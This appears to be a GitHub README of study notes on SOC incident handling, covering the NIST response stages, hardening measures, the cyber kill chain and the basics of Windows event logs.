# SOC - Incident Response and Threat Hunting

## Incident Handling Definition & Scope

Incident handling (IH) has become an important part of an organization's defensive capability against cybercrime. While protective measures are constantly being implemented to prevent or lower the amount of security incidents, an incident handling capability is undeniably a necessity for any organization that cannot afford a compromise of its data confidentiality, integrity, or availability. Some organizations choose to implement this capability in-house, while others rely on third-party providers to support them, continuously or when needed. Before we dive into the world of security incidents, let's define some terms and establish a common understanding of them.

 ### An event is an action occurring in a system or network. Examples of events are:

- A user sending an email
- A mouse click
- A firewall allowing a connection request
  
An incident is an event with a negative consequence. One example of an incident is a system crash. Another example is unauthorized access to sensitive data. Incidents can also occur due to natural disasters, power failures, etc.

There is no single definition for what an IT security incident is, and therefore it varies between organizations. We define an IT security incident as an event with a clear intent to cause harm that is performed against a computer system. Examples of incidents are:

- Data theft
- Funds theft
- Unauthorized access to data
- Installation and usage of malware and remote access tools
  
> [!IMPORTANT]
Incident handling is a clearly defined set of procedures to manage and respond to security incidents in a computer or network environment.

It is important to note that incident handling is not limited to intrusion incidents alone.

Other types of incidents, such as those caused by malicious insiders, availability issues, and loss of intellectual property, also fall within the scope of incident handling. A comprehensive incident handling plan should address various types of incidents and provide appropriate measures to identify, contain, eradicate, and recover from them to restore normal business operations as quickly and efficiently as possible.

Bear in mind that it may not be immediately clear that an event is an incident, until an initial investigation is performed. With that being said, there are some suspicious events that should be treated as incidents unless proven otherwise.

 ### Incident Handling's Value & Generic Notes.

IT security incidents frequently involve the compromise of personal and business data, and it is therefore crucial to respond quickly and effectively. In some incidents, the impact may be limited to a few devices, while in others a large part of the environment can be compromised. A great benefit of having an incident handling team (often referred to as an incident response team) handle events is that a trained workforce will respond systematically, and therefore appropriate actions will be taken. In fact, the objective of such teams is to minimize the theft of information or the disruption of services that the incident is causing. This is achieved by performing investigations and remediation steps, which we will discuss more in depth shortly. Overall, the decisions that are taken before, during, and after an incident will affect its impact.

Because different incidents will have different impacts on the organization, we need to understand the importance of prioritization. Incidents with greater severity will require immediate attention and resources to be allocated for them, while others rated lower may also require an initial investigation to understand whether it is in fact an IT security incident that we are dealing with.

The incident handling team is led by an incident manager. This role is often assigned to a SOC manager, CISO/CIO, or third-party (trusted) vendor, and this person usually has the ability to direct other business units as well. The incident manager must be able to obtain information or have the mandate to require any employee in the organization to perform an activity in a timely manner, if necessary. The incident manager is the single point of communication who tracks the activities taken during the investigation and their status of completion.

One of the most widely used resources on incident handling is NIST's Computer Security Incident Handling Guide. The document aims to assist organizations in mitigating the risks from computer security incidents by providing practical guidelines on responding to incidents effectively and efficiently.

> [!IMPORTANT]
Incident Handling Process Overview
we can better predict/anticipate next steps in an attack and also suggest appropriate measures against them. there are different stages, when responding to an incident, defined as the incident handling process. The incident handling process defines a capability for organizations to prepare, detect, and respond to malicious events. Note that this process is suited for responding to IT security events, but its stages do not correspond to the stages of the cyber kill chain in a one-to-one manner.

**As defined by NIST, the incident handling process consists of the following four (4) distinct stages:**

![2024-05-10_22-40](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/769d4578-7c9b-4b2c-838c-26524e228865)

Incident handlers spend most of their time in the first two stages, preparation and detection & analysis. This is where we spend a lot of time improving ourselves and looking for the next malicious event. When a malicious event is detected, we then move on to the next stage and respond to the event (but there should always be resources operating on the first two stages, so that there is no disruption of preparation and detection capabilities). As you can see in the image, the process is not linear but cyclic. The main point to understand at this point is that as new evidence is discovered, the next steps may change as well. It is vital to ensure that you don't skip steps in the process and that you complete a step before moving onto the next one. For example, if you discover ten infected machines, you should certainly not proceed with containing just five of them and starting eradication while the remaining five stay in an infected state. Such an approach can be ineffective because, at the bare minimum, you are notifying an attacker that you have discovered them and that you are hunting them down, which, as you could imagine, can have unpredictable consequences.

So, incident handling has two main activities, which are investigating and recovering. The investigation aims to:

-  Discover the initial 'patient zero' victim and create an (ongoing if still active) incident timeline
-  Determine what tools and malware the adversary used
-  Document the compromised systems and what the adversary has done

Following the investigation, the recovery activity involves creating and implementing a recovery plan. When the plan is implemented, the business should resume normal business operations, if the incident caused any disruptions.

When an incident is fully handled, a report is issued that details the cause and cost of the incident. Additionally, "lessons learned" activities are performed, among others, to understand what the organization should do to prevent incidents of similar type from occurring again.


### Preparation Stage (Part 1)

In the **preparation stage**, we have two separate objectives. The first one is the establishment of incident handling capability within the organization. The second is the ability to protect against and prevent IT security incidents by implementing appropriate protective measures. Such measures include endpoint and server hardening, active directory tiering, multi-factor authentication, privileged access management, and so on and so forth. While protecting against incidents is not the responsibility of the incident handling team, this activity is fundamental to the overall success of that team.

**Preparation Prerequisites**
During the preparation, we need to ensure that we have:

- Skilled incident handling team members (incident handling team members can be outsourced, but a basic capability and understanding of incident handling are necessary in-house regardless)
- Trained workforce (as much as possible, through security awareness activities or other means of training)
- Clear policies and documentation
- Tools (software and hardware)


### Clear Policies & Documentation
**Some of the written policies and documentation should contain an up-to-date version of the following information:**


- Contact information and roles of the incident handling team members
-Contact information for the legal and compliance department, management team, IT support, communications and media relations department, law enforcement, internet service providers, facility management, and external incident response team
- Incident response policy, plan, and procedures
- Incident information sharing policy and procedures
- Baselines of systems and networks, out of a golden image and a clean state environment
- Network diagrams
- Organization-wide asset management database
- User accounts with excessive privileges that can be used on-demand by the team when necessary (also to business-critical systems, which are handled with the skills needed to administer that specific system). These user accounts are normally enabled when an incident is confirmed during the initial investigation and then disabled once it is over. A mandatory password reset is also performed when disabling the users.
- Ability to acquire hardware, software, or an external resource without a complete procurement process (urgent purchase of up to a certain amount). The last thing you need during an incident is to wait for weeks for the approval of a $500 tool.
- Forensic/Investigative cheat sheets
Some of the non-severe cases may be handled relatively quickly and without too much friction within the organization or outside of it. Other cases may require law enforcement notification and external communication to customers and third-party vendors, especially in cases of legal concerns arising from the incident. For example, a data breach involving customer data has to be reported to law enforcement within a certain time threshold in accordance with GDPR. There may be many compliance requirements depending on the location and/or branches where the incident has occurred, so the best way to understand these is to discuss them with your legal and compliance teams on a per-incident basis (or proactively).

While having documentation in place is vital, it is also important to document the incident as you investigate. Therefore, during this stage you will also have to establish an effective reporting capability. Incidents can be extremely stressful, and it becomes easy to forget this part as the incident unfolds itself, especially when you are focused and going extremely fast in order to solve it as soon as possible. Try to remain calm, take notes, and ensure that these notes contain timestamps, the activity performed, the result of it, and who did it. Overall, you should seek answers to who, what, when, where, why and how.

Tools (Software & Hardware)
Moving forward, we also need to ensure that we have the right tools to perform the job. These include, but are not limited to:

- Additional laptop or a forensic workstation for each incident handling team member to preserve disk images and log files, perform data analysis, and investigate without any restrictions (we know malware will be tested here, so tools such as antivirus should be disabled). These devices should be handled appropriately and not in a way that introduces risks to the organization.
- Digital forensic image acquisition and analysis tools
- Memory capture and analysis tools
- Live response capture and analysis
- Log analysis tools
- Network capture and analysis tools
- Network cables and switches
- Write blockers
- Hard drives for forensic imaging
- Power cables
- Screwdrivers, tweezers, and other relevant tools to repair or disassemble hardware devices if needed
- Indicator of Compromise (IOC) creator and the ability to search for IOCs across the organization
- Chain of custody forms
- Encryption software
- Ticket tracking system
- Secure facility for storage and investigation
- Incident handling system independent of your organization's infrastructure

Many of the tools mentioned above will be part of what is known as a jump bag - always ready with the necessary tools to be picked up and leave immediately. Without this prepared bag, gathering all necessary tools on the fly may take days or weeks before you are ready to respond.

Finally, we want to stress the importance of having your documentation system completely independent from your organization's infrastructure and properly secured. Assume from the beginning that your entire domain is compromised and that all systems can become unavailable. In similar fashion, communications about an incident should be conducted through channels that are not part of the organization's systems; assume that adversaries have control over everything and can read communication channels such as email.


### Preparation Stage (Part 2)

Another part of the preparation stage is to protect against incidents. While protection is not necessarily the responsibility of an incident handling team, any protection-related activities should be known to them to better understand the type and sophistication of an incident and know where to look for artifacts/evidence, that could aid the investigation.

Let us now look at some of the highly recommended protective measures, which have a high mitigation impact against the majority of threats.

**DMARC**
DMARC is an email protection against phishing built on top of the already existing SPF and DKIM. The idea behind DMARC is to reject emails that 'pretend' to originate from your organization. Therefore, if an adversary is spoofing an email pretending to be an employee asking for an invoice to be paid, the system will reject the email before it reaches the intended recipient. DMARC is easy and inexpensive to implement, however, I cannot stress enough that thorough testing is mandatory; otherwise (and this is oftentimes the case), you risk blocking legitimate emails with no ability to recover them.

With email filtering rules, you may be able to take DMARC to the 'next' level and apply additional protection against emails failing DMARC from domains you do not own. This is possible because some email systems will perform a DMARC check and include a header stating whether DMARC passed or failed in the message headers. While this can be incredibly powerful to detect phishing emails from any domain, it requires extensive testing before it can be introduced in a production environment. High false-positives here are emails that are sent 'on behalf of' via some email sending service, since they tend to fail DMARC due to domain mismatch.

**Endpoint Hardening (& EDR)**
Endpoint devices (workstations, laptops, etc.) are the entry points for most of the attacks that we are facing on a daily basis. If we consider the fact that most threats will originate from the internet and will target users who are browsing websites, opening attachments, or running malicious executables, a percentage of this activity will occur from their corporate endpoints.

There are a few widely recognized endpoint hardening standards by now, with CIS and Microsoft baselines being the most popular, and these should really be the building blocks for your organization's hardening baselines. Some highly important actions (that actually work) to note and do something about are:

- Disable LLMNR/NetBIOS
- Implement LAPS and remove administrative privileges from regular users
- Disable or configure PowerShell in "ConstrainedLanguage" mode
- Enable Attack Surface Reduction (ASR) rules if using Microsoft Defender
- Implement whitelisting. We know this is nearly impossible to implement. Consider at least blocking execution from user-writable folders (Downloads, Desktop, AppData, etc.). These are the locations where exploits and malicious payloads will initially find themselves. Remember to also block script types such as .hta, .vbs, .cmd, .bat, .js, and similar. Please pay attention to LOLBin files while implementing whitelisting. Do not overlook them; they are really used in the wild as initial access to bypass whitelisting.
- Utilize host-based firewalls. As a bare minimum, block workstation-to-workstation communication and block outbound traffic to LOLBins
- Deploy an EDR product. At this point in time, AMSI provides great visibility into obfuscated scripts for antimalware products to inspect the content before it gets executed. It is highly recommended that you only choose products that integrate with AMSI.

When it comes to hardening, Don't let perfect be the enemy of good.

**Network Protection**
Network segmentation is a powerful technique to avoid having a breach spread across the entire organization. Business-critical systems must be isolated, and connections should be allowed only as the business requires. Internal resources should really not be facing the Internet directly (unless placed in a DMZ).

Additionally, when speaking of network protection you should consider IDS/IPS systems. Their power really shines when SSL/TLS interception is performed so that they can identify malicious traffic based on content on the wire and not based on reputation of IP addresses, which is a traditional and very inefficient way of detecting malicious traffic.

Additionally, ensure that only organization-approved devices can get on the network. Solutions such as 802.1x can be utilized to reduce the risk of bring your own device (BYOD) or malicious devices connecting to the corporate network. If you are a cloud-only company using, for example, Azure/Azure AD, then you can achieve similar protection with Conditional Access policies that will allow access to organization resources only if you are connecting from a company-managed device.

**Privilege Identity Management / MFA / Passwords**

At this point in time, stealing privileged user credentials is the most common escalation path in Active Directory environments. Additionally, a common mistake is that admin users either have a weak (but often complex) password or a shared password with their regular user account (which can be obtained via multiple attack vectors such as keylogging). For reference, a weak but complex password is "Password1!". It includes uppercase, lowercase, numerical, and special characters, but despite this, it's easily predictable and can be found in many password lists that adversaries employ in their attacks. It is recommended to teach employees to use pass phrases because they are harder to guess and difficult to brute force. An example of a password phrase that is easy to remember yet long and complex is "i LIK3 my coffeE warm". If one knows a second language, they can mix up words from multiple languages for additional protection.

Multi-factor authentication (MFA) is another identity-protecting solution that should be implemented at least for any type of administrative access to ALL applications and devices.

**Vulnerability Scanning**

Perform continuous vulnerability scans of your environment and remediate at least the "high" and "critical" vulnerabilities that are discovered. While the scanning can be automated, the fixes usually require manual involvement. If you can't apply patches for some reason, definitely segment the systems that are vulnerable!

**User Awareness Training**

Training users to recognize suspicious behavior and report it when discovered is a big win for us. While it is unlikely to reach 100% success on this task, these trainings are known to significantly reduce the number of successful compromises. Periodic "surprise" testing should also be part of this training, including, for example, monthly phishing emails, dropped USB sticks in the office building, etc.

**Active Directory Security Assessment**

The best way to detect security misconfigurations or exposed critical vulnerabilities is by looking for them from the perspective of an attacker. Doing your own reviews (or hiring a third party if the skillset is missing from the organization) will ensure that when an endpoint device is compromised, the attacker will not have a one-step escalation possibility to high privileges on the network. The more additional tools and activity an attacker is generating, the higher the likelihood of you detecting them, so try to eliminate easy wins and low-hanging fruits as much as possible.

Active Directory has a few known and unique escalation paths/bugs. New ones are quite often discovered too. Active Directory security assessments are crucial for the security posture of the environment as a whole. Don't assume that your system administrators are aware of all discovered or published bugs, because in reality they probably aren't.


**Purple Team Exercises**

We need to train incident handlers and keep them engaged. There is no question about that, and the best place to do it is inside an organization's own environment. Purple team exercises are essentially security assessments by a red team that either continuously or eventually inform the blue team about their actions, findings, any visibility/security shortcomings, etc. Such exercises will help in identifying vulnerabilities in an organization while testing the blue team's defensive capability in terms of logging, monitoring, detection, and responsiveness. If a threat goes unnoticed, there is an opportunity to improve. For those that are detected, the blue team can test any playbooks and incident handling procedures to ensure they are robust and the expected result has been achieved.


**Detection & Analysis Stage (Part 1)**

At this point, we have created processes and procedures, and we have guidelines on how to act upon security incidents.

The detection & analysis phase involves all aspects of detecting an incident, such as utilizing sensors, logs, and trained personnel. It also includes information and knowledge sharing, as well as utilizing context-based threat intelligence. Segmentation of the architecture and having a clear understanding of and visibility within the network are also important factors.

Threats are introduced to the organization via an infinite amount of attack vectors, and their detection can come from sources such as:


- An employee that notices abnormal behavior
- An alert from one of our tools (EDR, IDS, Firewall, SIEM, etc.)
- Threat hunting activities
- A third-party notification informing us that they discovered signs of our organization being compromised

It is highly recommended to create levels of detection by logically categorizing our network as follows.

- Detection at the network perimeter (using firewalls, internet-facing network intrusion detection/prevention systems, demilitarized zone, etc.)
- Detection at the internal network level (using local firewalls, host intrusion detection/prevention systems, etc.)
- Detection at the endpoint level (using antivirus systems, endpoint detection & response systems, etc.)
- Detection at the application level (using application logs, service logs, etc.)


**Initial Investigation**

When a security incident is detected, you should conduct some initial investigation and establish context before assembling the team and calling an organization-wide incident response. Think about how information is presented in the event of an administrative account connecting to an IP address at HH:MM:SS. Without knowing what system is on that IP address and which time zone the time refers to, we may easily jump to a wrong conclusion about what this event is about. To sum up, we should aim to collect as much information as possible at this stage about the following:

> [!IMPORTANT]
Date/Time when the incident was reported. Additionally, who detected the incident and/or who reported it?
How was the incident detected?
What was the incident? Phishing? System unavailability? etc.
Assemble a list of impacted systems (if relevant)
Document who has accessed the impacted systems and what actions have been taken. Make a note of whether this is an ongoing incident or the suspicious activity has been stopped
Physical location, operating systems, IP addresses and hostnames, system owner, system's purpose, current state of the system
(If malware is involved) List of IP addresses, time and date of detection, type of malware, systems impacted, export of malicious files with forensic information on them (such as hashes, copies of the files, etc.)

- Date/Time when the incident was reported. Additionally, who detected the incident and/or who reported it?
- How was the incident detected?
- What was the incident? Phishing? System unavailability? etc.
-Assemble a list of impacted systems (if relevant)
- Document who has accessed the impacted systems and what actions have been taken. Make a note of whether this is an ongoing incident or the suspicious activity has been stopped
- Physical location, operating systems, IP addresses and hostnames, system owner, system's purpose, current state of the system
- (If malware is involved) List of IP addresses, time and date of detection, type of malware, systems impacted, export of malicious files with forensic information on them (such as hashes, copies of the files, etc.)

With that information at hand, we can make decisions based on the knowledge we have gathered. What does this mean? We would likely take different actions if we knew that the CEO's laptop was compromised as opposed to an intern's one.

With the initially gathered information, we can start building an incident timeline. This timeline will keep us organized throughout the event and provide an overall picture of what happened. The events in the timeline are time-sorted based on when they occurred. Note that during the investigative process later on, we will not necessarily uncover evidence in this time-sorted order. However, when we sort the evidence based on when it occurred, we will get context from the separate events that took place. The timeline can also shed some light on whether newly discovered evidence is part of the current incident. For example, imagine that what we thought was the initial payload of an attack was later discovered to be present on another device two weeks ago. We will encounter situations where the data we are looking at is extremely relevant and situations where the data is unrelated and we are looking in the wrong place. Overall, the timeline should contain the information described in the following columns:

```
Date	Time of the event	hostname	event description	data source
```

Let's take one event and populate the example table from above. It will look as follows:

```
Date	Time of the event	hostname	event description	data source

```
```
09/09/2021	13:31 CET	SQLServer01	Hacker tool 'Mimikatz' was detected	Antivirus Software

```
As you can infer, the timeline focuses primarily on attacker behavior, so activities that are recorded depict when the attack occurred, when a network connection was established to access a system, when files were downloaded, etc. It is important to ensure that you capture from where the activity was detected/discovered and the systems associated with it.

> [!TIP]
Incident Severity & Extent Questions
When handling a security incident, we should also try to answer the following questions to get an idea of the incident's severity and extent:

- What is the exploitation impact?
- What are the exploitation requirements?
- Can any business-critical systems be affected by the incident?
- Are there any suggested remediation steps?
- How many systems have been impacted?
- Is the exploit being used in the wild?
- Does the exploit have any worm-like capabilities?

The last two can possibly indicate the level of sophistication of an adversary.

As you can imagine, high-impact incidents will be handled promptly, and incidents with a high number of impacted systems will have to be escalated.

### Incident Confidentiality & Communication

Incidents are very confidential topics and as such, all of the information gathered should be kept on a need-to-know basis, unless applicable laws or a management decision instruct us otherwise. There are multiple reasons for this. The adversary may be, for example, an employee of the company, or if a breach has occurred, the communication to internal and external parties should be handled by the appointed person in accordance with the legal department.

When an investigation is launched, we will set some expectations and goals. These often include the type of incident that occurred, the sources of evidence that we have available, and a rough estimation of how much time the team needs for the investigation. Also, based on the incident, we will set expectations on whether we will be able to uncover the adversary or not. Of course, a lot of the above may change as the investigation evolves and new leads are discovered. It is important to keep everyone involved and the management informed about any advancements and expectations.



**Detection & Analysis Stage (Part 2)**

When an investigation is started, we aim to understand what and how it happened. To analyze the incident-related data properly and efficiently, the incident handling team members need deep technical knowledge and experience in the field. One may ask, "Why do we care about how an incident happened? Why don't we simply rebuild the impacted systems and basically forget it ever happened?".

If we don't know how an incident happened or what was impacted, then any remediative steps we take will not ensure that the attacker cannot repeat his actions to regain access. If we, on the other hand, know exactly how the adversary got in, what tools they used, and which systems were impacted, then we can plan our remediation to ensure that this attack path cannot be replicated.

**The Investigation**

The investigation starts based on the initially gathered (and limited) information that contain what we know about the incident so far. With this initial data, we will begin a 3-step cyclic process that will iterate over and over again as the investigation evolves. This process includes:

- Creation and usage of indicators of compromise (IOC)
- Identification of new leads and impacted systems
- Data collection and analysis from the new leads and impacted systems


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c9af9c80-b512-4ef2-8f16-6672ba208e34)


Let us now elaborate more on the process depicted above.

**Initial Investigation Data**

In order to reach a conclusion, an investigation should be based on valid leads that have been discovered not only during this initial phase but throughout the entire investigation process. The incident handling team should bring up new leads constantly and not go solely after a specific finding, such as a known malicious tool. Narrowing an investigation down to a specific activity often results in limited findings, premature conclusions, and an incomplete understanding of the overall impact.


**Creation & Usage Of IOCs**

An indicator of compromise is a sign that an incident has occurred. IOCs are documented in a structured manner, which represents the artifacts of the compromise. Examples of IOCs can be IP addresses, hash values of files, and file names. In fact, because IOCs are so important to an investigation, special languages such as OpenIOC have been developed to document them and share them in a standard manner. Another widely used standard for IOCs is Yara. There are a number of free tools that can be utilized, such as Mandiant's IOC Editor, to create or edit IOCs. Using these languages, we can describe and use the artifacts that we uncover during an incident investigation. We may even obtain IOCs from third parties if the adversary or the attack is known.

To leverage IOCs, we will have to deploy an IOC-obtaining/IOC-searching tool (native or third party and possibly at scale). A common approach is to utilize WMI or PowerShell for IOC-related operations in Windows environments. A word of caution! During an investigation, we have to be extra careful to prevent the credentials of our highly privileged user(s) from being cached when connecting to (potentially) compromised systems (or any systems, really). More specifically, we need to ensure that only connection protocols and tools that don't cache credentials upon a successful login are utilized (such as WinRM). Windows logons with logon type 3 (Network Logon) typically don't cache credentials on the remote systems. The best example of "know your tools" that comes to mind is "PsExec". When "PsExec" is used with explicit credentials, those credentials are cached on the remote machine. When "PsExec" is used without credentials through the session of the currently logged on user, the credentials are not cached on the remote machine. This is a great example of demonstrating how the same tool leaves different tracks, so be aware.

**Identification Of New Leads & Impacted Systems**

After searching for IOCs, you expect to have some hits that reveal other systems with the same signs of compromise. These hits may not be directly associated with the incident we are investigating. Our IOC could be, for example, too generic. We need to identify and eliminate false positives. We may also end up in a position where we come across a large number of hits. In this case, we should prioritize the ones we will focus on, ideally those that can provide us with new leads after a potential forensic analysis.

**Data Collection & Analysis From The New Leads & Impacted Systems**

Once we have identified systems that included our IOCs, we will want to collect and preserve the state of those systems for further analysis in order to uncover new leads and/or answer investigative questions about the incident. Depending on the system, there are multiple approaches to how and what data to collect. Sometimes we want to perform a 'live response' on a system as it is running, while in other cases we may want to shut down a system and then perform any analysis on it. Live response is the most common approach, where we collect a predefined set of data that is usually rich in artifacts that may explain what happened to a system. Shutting down a system is not an easy decision when it comes to preserving valuable information because, in many cases, much of the artifacts will only live within the RAM memory of the machine, which will be lost if the machine is turned off. Regardless of the collection approach we choose, it is vital to ensure that minimal interaction with the system occurs to avoid altering any evidence or artifacts.

Once the data has been collected, it is time to analyze it. This is often the most time-consuming process during an incident. Malware analysis and disk forensics are the most common examination types. Any newly discovered and validated leads are added to the timeline, which is constantly updated. Also note that memory forensics is a capability that is becoming more and more popular and is extremely relevant when dealing with advanced attacks.

Keep in mind that during the data collection process, you should keep track of the chain of custody to ensure that the examined data is court-admissible if legal action is to be taken against an adversary.

**Containment, Eradication, & Recovery Stage**

When the investigation is complete and we have understood the type of incident and the impact on the business (based on all the leads gathered and the information assembled in the timeline), it is time to enter the containment stage to prevent the incident from causing more damage.

**Containment**

n this stage, we take action to prevent the spread of the incident. We divide the actions into short-term containment and long-term containment. It is important that containment actions are coordinated and executed across all systems simultaneously. Otherwise, we risk notifying attackers that we are after them, in which case they might change their techniques and tools in order to persist in the environment.

In short-term containment, the actions taken leave a minimal footprint on the systems on which they occur. Some of these actions can include, placing a system in a separate/isolated VLAN, pulling the network cable out of the system(s) or modifying the attacker's C2 DNS name to a system under our control or to a non-existing one. The actions here contain the damage and provide time to develop a more concrete remediation strategy. Additionally, since we keep the systems unaltered (as much as possible), we have the opportunity to take forensic images and preserve evidence if this wasn't already done during the investigation (this is also known as the backup substage of the containment stage). If a short-term containment action requires shutting down a system, we have to ensure that this is communicated to the business and appropriate permissions are granted.

In long-term containment actions, we focus on persistent actions and changes. These can include changing user passwords, applying firewall rules, inserting a host intrusion detection system, applying a system patch, and shutting down systems. While doing these activities, we should keep the business and the relevant stakeholders updated. Bear in mind that just because a system is now patched does not mean that the incident is over. Eradication, recovery, and post-incident activities are still pending.


**Eradication**

Once the incident is contained, eradication is necessary to eliminate both the root cause of the incident and what is left of it to ensure that the adversary is out of the systems and network. Some of the activities in this stage include removing the detected malware from systems, rebuilding some systems, and restoring others from backup. During the eradication stage, we may extend the previously performed containment activities by applying additional patches, which were not immediately required. Additional system-hardening activities are often performed during the eradication stage (not only on the impacted system but across the network in some cases).

**Recovery**
n the recovery stage, we bring systems back to normal operation. Of course, the business needs to verify that a system is in fact working as expected and that it contains all the necessary data. When everything is verified, these systems are brought into the production environment. All restored systems will be subject to heavy logging and monitoring after an incident, as compromised systems tend to be targets again if the adversary regains access to the environment in a short period of time. Typical suspicious events to monitor for are:

- Unusual logons (e.g. user or service accounts that have never logged in there before)
- Unusual processes
- Changes to the registry in locations that are usually modified by malware

The recovery stage in some large incidents may take months, since it is often approached in phases. During the early phases, the focus is on increasing overall security to prevent future incidents through quick wins and the elimination of low-hanging fruits. The later phases focus on permanent, long-term changes to keep the organization as secure as possible.

**Post-Incident Activity Stage**

In this stage, our objective is to document the incident and improve our capabilities based on lessons learned from it. This stage gives us an opportunity to reflect on the threat by understanding what occurred, what we did, and how our actions and activities worked out. This information is best gathered and analyzed in a meeting with all stakeholders that were involved during the incident. It generally takes place within a few days after the incident, when the incident report has been finalized.

**Reporting**
The final report is a crucial part of the entire process. A complete report will contain answers to questions such as:

-  What happened and when?
-  Performance of the team dealing with the incident in regard to plans, playbooks, policies, and procedures
-  Did the business provide the necessary information and respond promptly to aid in handling the incident in an efficient manner? What can be improved?
-  What actions have been implemented to contain and eradicate the incident?
-  What preventive measures should be put in place to prevent similar incidents in the future?
-  What tools and resources are needed to detect and analyze similar incidents in the future?

Such reports can eventually provide us with measurable results. For example, they can provide us with knowledge around how many incidents have been handled, how much time the team spends per incident, and the different actions that were performed during the handling process. Additionally, incident reports also provide a reference for handling future events of similar nature. In situations where legal action is to be taken, an incident report will also be used in court and as a source for identifying the costs and impact of incidents.

This stage is also a great place to train new team members by showing them how the incident was handled by more experienced colleagues. The team should also evaluate whether updating plans, playbooks, policies, and procedures is necessary. During the post-incident activity state, it is important that we reevaluate the tools, training, and readiness of the team, as well as the overall team structure, and not focus only on the documentation and process front.

> [!IMPORTANT]
Cyber Kill Chain

### What Is The Cyber Kill Chain?
Before we start talking about handling incidents, we need to understand the attack lifecycle (a.k.a. the cyber kill chain). This lifecycle describes how attacks manifest themselves. Understanding this lifecycle will provide us with valuable insights on how far in the network an attacker is and what they may have access to during the investigation phase of an incident.

The cyber kill chain consists of seven (7) different stages, as depicted in the image below:
![Cyber_kill_chain](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/51492a34-b6dd-4bba-99a8-538295abe4c3)

The **recon ** stage is the initial stage, and it involves the part where an attacker chooses their target. Additionally, the attacker then performs information gathering to become more familiar with the target and gathers as much useful data as possible, which can be used in not only this stage but also in other stages of this chain. Some attackers prefer to perform passive information gathering from web sources such as LinkedIn and Instagram but also from documentation on the target organization's web pages. Job ads and company partners often reveal information about the technology utilized in the target organization. They can provide extremely specific information about antivirus tools, operating systems, and networking technologies. Other attackers go a step further; they start 'poking' and actively scan external web applications and IP addresses that belong to the target organization.

In the **weaponize stage**, the malware to be used for initial access is developed and embedded into some type of exploit or deliverable payload. This malware is crafted to be extremely lightweight and undetectable by the antivirus and detection tools. It is likely that the attacker has gathered information to identify the present antivirus or EDR technology in the target organization. On a large scale, the sole purpose of this initial stage is to provide remote access to a compromised machine in the target environment, which also has the capability to persist through machine reboots and the ability to deploy additional tools and functionality on demand.

In the **delivery stage**, the exploit or payload is delivered to the victim(s). Traditional approaches are phishing emails that either contain a malicious attachment or a link to a web page. The web page can be twofold: either containing an exploit or hosting the malicious payload to avoid sending it through email scanning tools. In all fairness, the web page can also mimic a legit website used by the target organization in an attempt to trick the victim into entering their credentials and collect them. Some attackers call the victim on the phone with a social engineering pretext in an attempt to convince the victim to run the payload. The payload in these trust-gaining cases is hosted on an attacker-controlled web site that mimics a well-known web site to the victim (e.g., a copy of the target organization's website). It is extremely rare to deliver a payload that requires the victim to do more than double-click an executable file or a script (in Windows environments, this can be .bat, .cmd, .vbs, .js, .hta and other formats). Finally, there are cases where physical interaction is utilized to deliver the payload via USB tokens and similar storage tools, that are purposely left around.

The **exploitation** stage is the moment when an exploit or a delivered payload is triggered. During the exploitation stage of the cyber kill chain, the attacker typically attempts to execute code on the target system in order to gain access or control.

In the **installation stage**, the initial stager is executed and is running on the compromised machine. As already discussed, the installation stage can be carried out in various ways, depending on the attacker's goals and the nature of the compromise. Some common techniques used in the installation stage include:

Droppers: Attackers may use droppers to deliver malware onto the target system. A dropper is a small piece of code that is designed to install malware on the system and execute it. The dropper may be delivered through various means, such as email attachments, malicious websites, or social engineering tactics.

Backdoors: A backdoor is a type of malware that is designed to provide the attacker with ongoing access to the compromised system. The backdoor may be installed by the attacker during the exploitation stage or delivered through a dropper. Once installed, the backdoor can be used to execute further attacks or steal data from the compromised system.

Rootkits: A rootkit is a type of malware that is designed to hide its presence on a compromised system. Rootkits are often used in the installation stage to evade detection by antivirus software and other security tools. The rootkit may be installed by the attacker during the exploitation stage or delivered through a dropper.

In the **command and control stage**, the attacker establishes a remote access capability to the compromised machine. As discussed, it is not uncommon to use a modular initial stager that loads additional scripts 'on-the-fly'. However, advanced groups will utilize separate tools in order to ensure that multiple variants of their malware live in a compromised network, and if one of them gets discovered and contained, they still have the means to return to the environment.

The final stage of the chain is the** action or objective of the attack**. The objective of each attack can vary. Some adversaries may go after exfiltrating confidential data, while others may want to obtain the highest level of access possible within a network to deploy ransomware. Ransomware is a type of malware that will render all data stored on endpoint devices and servers unusable or inaccessible unless a ransom is paid within a limited timeframe (not recommended).

It is important to understand that adversaries won't operate in a linear manner (like the cyber kill chain shows). Some previous cyber kill chain stages will be repeated over and over again. If we take, for example, the installation stage of a successful compromise, the logical next step for an adversary going forward is to initiate the recon stage again to identify additional targets and find vulnerabilities to exploit, so that he moves deeper into the network and eventually achieves the attack's objective(s).

### Windows Event Logs
**Windows Event Logging Basics**

Windows Event Logs are an intrinsic part of the Windows Operating System, storing logs from different components of the system including the system itself, applications running on it, ETW providers, services, and others.

Windows event logging offers comprehensive logging capabilities for application errors, security events, and diagnostic information. As cybersecurity professionals, we leverage these logs extensively for analysis and intrusion detection.

The logs are categorized into different event logs, such as "Application", "System", "Security", and others, to organize events based on their source or purpose.

Event logs can be accessed using the Event Viewer application or programmatically using APIs such as the Windows Event Log API.

Accessing the Windows Event Viewer as an administrative user allows us to explore the various logs available

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b8e745f5-cdc0-4e3e-a0ea-a5b756d4fe0a)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2c726f06-145a-4002-b581-e20dc9d2082c)

The default Windows event logs consist of Application, Security, Setup, System, and Forwarded Events. While the first four logs cover application errors, security events, system setup activities, and general system information, the "Forwarded Events" section is unique, showcasing event log data forwarded from other machines. This central logging feature proves valuable for system administrators who desire a consolidated view. In our current analysis, we focus on event logs from a single machine.

It should be noted, that the Windows Event Viewer has the ability to open and display previously saved .evtx files, which can be then found in the "Saved Logs" section.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/311bf638-27d4-4553-b7f0-7f1c2fbd3fff)

**The Anatomy of an Event Log**
When examining Application logs, we encounter two distinct levels of events: information and error

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/0a054914-6430-4e4c-a7c6-d43c26dd08ca)

Information events provide general usage details about the application, such as its start or stop events. Conversely, error events highlight specific errors and often offer detailed insights into the encountered issues.

